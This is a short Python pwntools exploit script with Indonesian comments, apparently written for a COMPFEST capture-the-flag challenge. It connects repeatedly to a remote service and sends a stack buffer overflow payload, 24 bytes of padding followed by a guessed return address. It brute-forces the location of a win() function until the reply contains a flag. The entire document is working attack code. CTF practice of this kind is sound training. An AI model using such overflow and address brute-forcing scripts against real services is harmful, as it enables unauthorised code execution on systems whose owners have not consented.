from pwn import *

context.log_level = 'warn'  # ganti 'debug' kalau mau lihat detail
offset = 24  # sesuaikan dengan offset ke RIP dari hasil exploitasi kamu

host = "ctf.compfest.id"
port = 7004

# Range tebakan alamat win(), sesuaikan dengan binary (disini tebakan dari 0x401000 ke 0x402000)
for addr in range(0x401000, 0x402000, 0x10):
    try:
        io = remote(host, port)
        payload = b"A" * offset + p64(addr)
        io.sendline(payload)
        res = io.recv(timeout=1)
        if b"COMPFEST" in res or b"flag" in res or b"{" in res:
            print(f"[+] Mungkin alamat win: {hex(addr)}")
            print(res.decode(errors='ignore'))
            break
        io.close()
    except Exception:
        continue
